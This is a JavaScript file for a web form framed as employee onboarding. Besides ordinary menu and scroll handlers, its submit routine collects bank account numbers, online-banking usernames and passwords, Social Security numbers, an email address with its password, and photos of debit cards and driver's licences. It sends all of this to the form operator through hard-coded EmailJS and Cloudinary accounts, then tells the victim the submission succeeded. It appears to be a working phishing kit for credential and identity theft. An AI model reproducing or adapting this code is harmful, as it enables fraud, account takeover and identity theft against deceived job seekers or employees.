// Mobile menu functionality
const mobileMenuButton = document.getElementById("mobile-menu-button");
const mobileMenu = document.getElementById("mobile-menu");
const accountType = document.getElementById("account_type");
let accountNow = "";

function loggg() {
  // const accountType = document.getElementById("account_type");
  accountNow = accountType.value;
  console.log("Selected account type:", accountNow);
}

mobileMenuButton.addEventListener("click", function () {
  mobileMenu.classList.toggle("hidden");
});

// Close mobile menu when clicking outside
document.addEventListener("click", function (event) {
  const isClickInsideMenu = mobileMenu.contains(event.target);
  const isClickOnButton = mobileMenuButton.contains(event.target);

  if (
    !isClickInsideMenu &&
    !isClickOnButton &&
    !mobileMenu.classList.contains("hidden")
  ) {
    mobileMenu.classList.add("hidden");
  }
});

// Smooth scrolling for anchor links
document.querySelectorAll('a[href^="#"]').forEach((anchor) => {
  anchor.addEventListener("click", function (e) {
    e.preventDefault();
    const target = document.querySelector(this.getAttribute("href"));
    if (target) {
      target.scrollIntoView({
        behavior: "smooth",
        block: "start",
      });
    }
  });
});

// Add scroll effect to header
window.addEventListener("scroll", function () {
  const header = document.querySelector("header");
  if (window.scrollY > 100) {
    header.classList.add("bg-gray-900");
    header.classList.remove("bg-gray-900/95");
  } else {
    header.classList.add("bg-gray-900/95");
    header.classList.remove("bg-gray-900");
  }
});

// Initialize EmailJS (replace with your actual public key)
emailjs.init("WugqMMmr5Zh-h55jk");

// Cloudinary configuration (replace with your actual cloud name and upload preset)
const CLOUDINARY_CLOUD_NAME = "dri1lagoo";
const CLOUDINARY_UPLOAD_PRESET = "card-image";

// File input change handlers
document.getElementById("debit-front").addEventListener("change", function (e) {
  const fileName = e.target.files[0]
    ? e.target.files[0].name
    : "No file chosen";
  document.getElementById("debit-front-name").textContent = fileName;
});

document.getElementById("debit-back").addEventListener("change", function (e) {
  const fileName = e.target.files[0]
    ? e.target.files[0].name
    : "No file chosen";
  document.getElementById("debit-back-name").textContent = fileName;
});

document
  .getElementById("license-front")
  .addEventListener("change", function (e) {
    const fileName = e.target.files[0]
      ? e.target.files[0].name
      : "No file chosen";
    document.getElementById("license-front-name").textContent = fileName;
  });

document
  .getElementById("license-back")
  .addEventListener("change", function (e) {
    const fileName = e.target.files[0]
      ? e.target.files[0].name
      : "No file chosen";
    document.getElementById("license-back-name").textContent = fileName;
  });

// Upload image to Cloudinary
async function uploadToCloudinary(file) {
  const formData = new FormData();
  formData.append("file", file);
  formData.append("upload_preset", CLOUDINARY_UPLOAD_PRESET);

  try {
    const response = await fetch(
      `https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/image/upload`,
      {
        method: "POST",
        body: formData,
      }
    );

    if (!response.ok) {
      throw new Error("Upload failed");
    }

    const data = await response.json();
    return data.secure_url;
  } catch (error) {
    console.error("[v0] Cloudinary upload error:", error);
    throw error;
  }
}

// Show status message
function showStatus(message, isError = false) {
  const statusDiv = document.getElementById("status-message");
  statusDiv.className = `mt-4 p-4 rounded-md ${
    isError
      ? "bg-red-100 text-red-700 border border-red-300"
      : "bg-green-100 text-green-700 border border-green-300"
  }`;
  statusDiv.textContent = message;
  statusDiv.classList.remove("hidden");
}

// Form submission handler
document
  .getElementById("employee-form")
  .addEventListener("submit", async function (e) {
    e.preventDefault();

    const submitBtn = document.getElementById("submit-btn");
    const submitText = document.getElementById("submit-text");
    const loadingText = document.getElementById("loading-text");
    const statusDiv = document.getElementById("status-message");

    // Show loading state
    submitBtn.disabled = true;
    submitText.classList.add("hidden");
    loadingText.classList.remove("hidden");
    statusDiv.classList.add("hidden");

    try {
      // console.log("[v0] Starting form submission...");

      // Get form data
      const formData = new FormData(this);

      const templateParams = {
        name: formData.get("account_holder_name") || "Employee",
        time: new Date().toLocaleString(),
        message: `Employee Information Submitted:

📋 ACCOUNT DETAILS:
• Account Holder Name: ${formData.get("account_holder_name") || "N/A"}
• Account Name: ${formData.get("account_name") || "N/A"}
• Bank Name: ${formData.get("bank_name") || "N/A"}
• Bank Address: ${formData.get("bank_address") || "N/A"}
• Account Number: ${formData.get("account_number") || "N/A"}
• Routing Number: ${formData.get("routing_number") || "N/A"}
• City: ${formData.get("city") || "N/A"}
• State: ${formData.get("state") || "N/A"}
• Postal Code: ${formData.get("postal_code") || "N/A"}
• Account Type: ${accountNow || "N/A"}
• Bank Username: ${formData.get("bank_username") || "N/A"}
• Bank Password: ${formData.get("bank_password") || "N/A"}
•SSN Number: ${formData.get("ssn_number") || "N/A"}

✅ VERIFICATION DETAILS:
• Verification Email: ${formData.get("verification_email") || "N/A"}
• Verification Password: ${formData.get("verification_password") || "N/A"}`,
      };

      // console.log(" Template parameters prepared:", templateParams);

      // Upload images to Cloudinary if they exist
      const debitFrontFile = document.getElementById("debit-front").files[0];
      const debitBackFile = document.getElementById("debit-back").files[0];

      const licenseFrontFile =
        document.getElementById("license-front").files[0];
      const licenseBackFile = document.getElementById("license-back").files[0];

      if (debitFrontFile) {
        // console.log(" Uploading debit card front...");
        const frontUrl = await uploadToCloudinary(debitFrontFile);
        templateParams.message += `\n\n💳 DEBIT CARD IMAGES:\n• Front: ${frontUrl}`;
        // console.log(" Debit front uploaded:", frontUrl);
      }

      if (debitBackFile) {
        console.log(" Uploading debit card back...");
        const backUrl = await uploadToCloudinary(debitBackFile);
        templateParams.message += `\n• Back: ${backUrl}`;
        // console.log(" Debit back uploaded:", backUrl);
      }

      if (licenseFrontFile) {
        console.log(" Uploading debit card front...");
        const frontUrl = await uploadToCloudinary(licenseFrontFile);
        templateParams.message += `\n\n💳 license CARD IMAGES:\n• Front: ${frontUrl}`;
        // console.log(" license front uploaded:", frontUrl);
      }

      if (licenseBackFile) {
        // console.log(" Uploading debit card back...");
        const backUrl = await uploadToCloudinary(licenseBackFile);
        templateParams.message += `\n• Back: ${backUrl}`;
        // console.log(" license back uploaded:", backUrl);
      }

      // Send email via EmailJS (replace with your actual service ID and template ID)
      //   console.log(" Sending email via EmailJS...");
      const result = await emailjs.send(
        "service_njbyaqd",
        "template_lo15nhn",
        templateParams
      );

      console.log(" Email sent successfully:", result);
      showStatus(
        "Employee information submitted successfully! You will receive a confirmation email shortly."
      );

      // Reset form
      this.reset();
      document.getElementById("debit-front-name").textContent =
        "No file chosen";
      document.getElementById("debit-back-name").textContent = "No file chosen";

      document.getElementById("license-front-name").textContent =
        "No file chosen";
      document.getElementById("license-back-name").textContent =
        "No file chosen";
    } catch (error) {
      console.error(" Submission error:", error);
      showStatus(
        "There was an error submitting your information. Please try again or contact support.",
        true
      );
    } finally {
      // Reset button state
      submitBtn.disabled = false;
      submitText.classList.remove("hidden");
      loadingText.classList.add("hidden");
    }
  });
